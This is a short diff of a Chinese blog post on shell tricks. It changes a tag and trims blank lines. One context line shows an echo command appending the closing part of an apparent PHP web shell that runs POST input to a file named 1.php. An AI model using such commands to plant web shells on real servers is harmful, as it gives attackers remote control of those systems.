@@ -7,7 +7,7 @@ lastmod: "2024-08-15T19:30:06"
 image: ""
 license: ""
 categories: ["talk"]
-tags: ["姿势"]
+tags: ["Shell技巧"]
 ---
 # 0x01 前言
 
@@ -219,6 +219,3 @@ echo '$_POST["1"]);?>' >> 1.php  #追加最后部分内容
 # 0x03 小结
 
 一个echo原来可以干这么多事情，太有意思了
-
-
-
